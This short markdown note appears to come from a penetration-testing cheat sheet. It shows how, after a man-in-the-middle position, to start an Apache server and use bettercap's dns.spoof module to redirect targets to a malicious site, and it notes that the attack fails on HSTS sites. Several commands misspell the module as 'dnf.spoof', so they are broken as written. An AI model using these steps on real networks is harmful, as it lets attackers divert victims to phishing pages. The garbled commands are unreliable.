---
---

After performing MITM attack all the targets packets are flowing through our system. We can redirect the user to an malicious website by spoofing the DNS request of the user

#### Start Apache Server

````bash
systemctl start apache2.service
````

/var/www/html : Location of Apache Files

#### DNS Spoofing

````bash
bettercap -iface <interface> -caplet <spoof-data-cap-file>
help dns.spoof

set dnf.spoof.all true
# Domains for which DNS should be spoofed
set dnf.spoof.domains <domains> 
dnf.spoof on
````

This attack does not work on HSTS websites
